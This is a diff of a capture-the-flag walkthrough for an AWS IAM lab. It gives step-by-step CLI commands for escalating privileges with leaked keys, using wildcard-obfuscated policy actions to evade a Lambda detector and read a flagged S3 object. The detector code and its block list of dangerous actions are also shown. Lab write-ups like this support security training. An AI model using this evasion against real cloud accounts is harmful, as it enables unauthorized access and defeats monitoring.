@@ -1,25 +1,4 @@
-# Obfuscated Policy - Walkthrough
-
-> **Security Note**: Use placeholders for all AWS Account IDs, Access Keys, and Secret Keys.
-> - Account ID: `123456789012`
-> - Access Key: `AKIAIOSFODNN7EXAMPLE` or `ASIAXXXXXXXXXXX`
-> - Secret Key: `xxxxxxxx` or mask actual values
-> - Scenario ID suffix: `xxxxxxxx`
-
-## Attack Path
-
-```mermaid
-flowchart TB
-    A[Leaked Access Key] --> B[Identity Confirmation]
-    B --> C[Permission Enumeration]
-    C --> D[Try literal s3:ListAllMyBuckets policy]
-    D -->|Lambda deletes it| E[Bypass: Action s3:List?llMyBuckets]
-    E --> F[Attach + s3 ls -> bucket name]
-    F --> G[Try literal s3:GetObject policy]
-    G -->|Lambda deletes it| H[Bypass: Action s3:Get?bject]
-    H --> I[Attach + GetObject]
-    I --> J[FLAG]
-```
+# Walkthrough
 
 ## Step 1: Identity Confirmation
 
@@ -28,8 +7,6 @@ Verify who you are with the leaked credentials.
 ```bash
 aws sts get-caller-identity --profile attacker
 ```
-
-![Identity confirmation](./assets/1.png)
 
 You are an IAM user under `gnawlab/gnawlab-iampoly-attacker-xxxxxxxx`.
 
@@ -44,7 +21,15 @@ USER_NAME="gnawlab-iampoly-attacker-xxxxxxxx"
 aws iam list-user-policies --user-name "$USER_NAME" --profile attacker
 ```
 
-![List user policies](./assets/2.png)
+Output:
+
+```json
+{
+    "PolicyNames": [
+        "gnawlab-iampoly-attacker-policy-xxxxxxxx"
+    ]
+}
+```
 
 ```bash
 # Read the inline policy contents
@@ -54,7 +39,21 @@ aws iam get-user-policy \
   --profile attacker
 ```
 
-![Get user policy](./assets/3.png)
+Output (excerpt):
+
+```json
+{
+    "PolicyDocument": {
+        "Version": "2012-10-17",
+        "Statement": [
+            {"Sid": "IdentityVerification", "Effect": "Allow", "Action": ["sts:GetCallerIdentity"], "Resource": "*"},
+            {"Sid": "SelfEnumeration", "Effect": "Allow", "Action": ["iam:GetUser", "iam:ListUserPolicies", "iam:GetUserPolicy", "iam:ListAttachedUserPolicies", "iam:ListGroupsForUser", "iam:ListGroupPolicies", "iam:ListAttachedGroupPolicies", "iam:GetGroupPolicy"], "Resource": ["arn:aws:iam::123456789012:user/gnawlab/gnawlab-iampoly-attacker-xxxxxxxx", "arn:aws:iam::123456789012:group/*"]},
+            {"Sid": "PolicyCreationAndSelfAttach", "Effect": "Allow", "Action": ["iam:CreatePolicy", "iam:GetPolicy", "iam:GetPolicyVersion", "iam:ListPolicyVersions"], "Resource": "*"},
+            {"Sid": "AttachOwnedPolicy", "Effect": "Allow", "Action": ["iam:AttachUserPolicy"], "Resource": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-iampoly-attacker-xxxxxxxx"}
+        ]
+    }
+}
+```
 
 ```bash
 # User attached managed policies
@@ -64,7 +63,7 @@ aws iam list-attached-user-policies --user-name "$USER_NAME" --profile attacker
 aws iam list-groups-for-user --user-name "$USER_NAME" --profile attacker
 ```
 
-Both return empty. The user has no group memberships and no managed policies.
+Both return empty (`AttachedPolicies: []`, `Groups: []`). The user has no group memberships and no managed policies.
 
 **Findings:**
 - Identity / self-enumeration permissions only.
@@ -88,16 +87,12 @@ cat > /tmp/naive-list.json <<'JSON'
 JSON
 ```
 
-![Create naive list policy file](./assets/4.png)
-
 ```bash
 aws iam create-policy \
   --policy-name naive-list \
   --policy-document file:///tmp/naive-list.json \
   --profile attacker
 ```
-
-![Create naive list policy](./assets/5.png)
 
 The policy is created. Wait 30-60 seconds, then check again:
 
@@ -107,8 +102,6 @@ aws iam get-policy \
   --policy-arn "arn:aws:iam::${ACCOUNT_ID}:policy/naive-list" \
   --profile attacker
 ```
-
-![NoSuchEntity for naive list](./assets/6.png)
 
 `NoSuchEntity` confirms the detection Lambda deleted the policy. The detector reads `CreatePolicy` events from CloudTrail (via EventBridge) and inspects the policy JSON for blocked literal strings. `"s3:ListAllMyBuckets"` is one of them.
 
@@ -142,8 +135,6 @@ cat > /tmp/list-bypass.json <<'JSON'
 JSON
 ```
 
-![Create list bypass policy file](./assets/7.png)
-
 ```bash
 LIST_ARN=$(aws iam create-policy \
   --policy-name list-bypass \
@@ -153,8 +144,6 @@ LIST_ARN=$(aws iam create-policy \
 
 echo "$LIST_ARN"
 ```
-
-![Create list bypass policy](./assets/8.png)
 
 Wait 30-60 seconds and confirm the policy is still alive:
 
@@ -171,8 +160,6 @@ aws iam attach-user-policy \
   --profile attacker
 ```
 
-![Attach list bypass policy](./assets/9.png)
-
 > **Note:** IAM permission propagation typically takes 30-60 seconds after attaching a policy. If `aws s3 ls` returns `AccessDenied` immediately after attach, wait another minute and retry.
 
 Now enumerate buckets:
@@ -182,13 +169,11 @@ sleep 60
 aws s3 ls --profile attacker
 ```
 
-![List buckets](./assets/10.png)
-
 The flag bucket name is now visible (`gnawlab-iampoly-flag-xxxxxxxx`).
 
-## Step 5: Exploit Phase 2 - Read the Flag via Wildcard Obfuscation
+## Step 5: Reconnaissance - Confirm GetObject Literal Is Blocked
 
-First confirm that a literal `s3:GetObject` policy is also blocked.
+Repeat the detector test for the action that actually reads the flag.
 
 ```bash
 FLAG_BUCKET="gnawlab-iampoly-flag-xxxxxxxx"
@@ -205,8 +190,6 @@ cat > /tmp/naive-get.json <<JSON
 JSON
 ```
 
-![Create naive get policy file](./assets/15.png)
-
 ```bash
 aws iam create-policy \
   --policy-name naive-get \
@@ -214,9 +197,7 @@ aws iam create-policy \
   --profile attacker
 ```
 
-![Create naive get policy](./assets/16.png)
-
-After ~30-60 seconds, verify deletion:
+Wait 30-60 seconds, then verify deletion:
 
 ```bash
 aws iam get-policy \
@@ -224,9 +205,11 @@ aws iam get-policy \
   --profile attacker
 ```
 
-![NoSuchEntity for naive get](./assets/17.png)
+`NoSuchEntity` confirms `"s3:GetObject"` is also on the detector's literal block list.
 
-Now use the wildcard-obfuscated equivalent (vendor stays literal `s3:`, action name uses `?`):
+## Step 6: Exploit Phase 2 - Read the Flag via Wildcard Obfuscation
+
+Use the wildcard-obfuscated equivalent (vendor stays literal `s3:`, action name uses `?`):
 
 ```
 s3:Get?bject
@@ -250,8 +233,6 @@ cat > /tmp/get-bypass.json <<JSON
 JSON
 ```
 
-![Create get bypass policy file](./assets/11.png)
-
 ```bash
 GET_ARN=$(aws iam create-policy \
   --policy-name get-bypass \
@@ -260,7 +241,13 @@ GET_ARN=$(aws iam create-policy \
   --query 'Policy.Arn' --output text)
 ```
 
-![Create get bypass policy](./assets/12.png)
+Wait 30-60 seconds and confirm the policy survives:
+
+```bash
+aws iam get-policy --policy-arn "$GET_ARN" --profile attacker
+```
+
+Attach it to your own user:
 
 ```bash
 aws iam attach-user-policy \
@@ -269,9 +256,7 @@ aws iam attach-user-policy \
   --profile attacker
 ```
 
-![Attach get bypass policy](./assets/13.png)
-
-## Step 6: Capture the Flag
+## Step 7: Capture the Flag
 
 Wait for IAM permission propagation, then read the flag:
 
@@ -279,8 +264,6 @@ Wait for IAM permission propagation, then read the flag:
 sleep 60
 aws s3 cp "s3://${FLAG_BUCKET}/flag.txt" - --profile attacker
 ```
-
-![Capture the flag](./assets/14.png)
 
 Output:
 
@@ -300,19 +283,21 @@ FLAG{iam_wildcard_obfuscation_bypass_complete}
    - iam:ListAttachedUserPolicies
    - iam:ListGroupsForUser
    |
-3. Detection Reconnaissance
+3. Detection Reconnaissance - ListAllMyBuckets
    - Create literal s3:ListAllMyBuckets policy -> deleted by Lambda
    |
 4. Wildcard Obfuscation - Bucket Enumeration
    - Action: s3:List?llMyBuckets  (IAM = s3:ListAllMyBuckets)
    - Survives detector, attach to self, list buckets
    |
-5. Wildcard Obfuscation - Object Read
-   - Confirm s3:GetObject literal is also deleted
+5. Detection Reconnaissance - GetObject
+   - Create literal s3:GetObject policy -> deleted by Lambda
+   |
+6. Wildcard Obfuscation - Object Read
    - Action: s3:Get?bject  (IAM = s3:GetObject)
    - Survives detector, attach to self
    |
-6. FLAG{iam_wildcard_obfuscation_bypass_complete}
+7. FLAG{iam_wildcard_obfuscation_bypass_complete}
 ```
 
 ---
@@ -407,12 +392,10 @@ DANGEROUS_ACTIONS = [
     "iam:PassRole",
 ]
 
-
 def expand_actions(statement_actions):
     if isinstance(statement_actions, str):
         return [statement_actions]
     return list(statement_actions)
-
 
 def is_dangerous(policy_document):
     for stmt in policy_document.get("Statement", []):
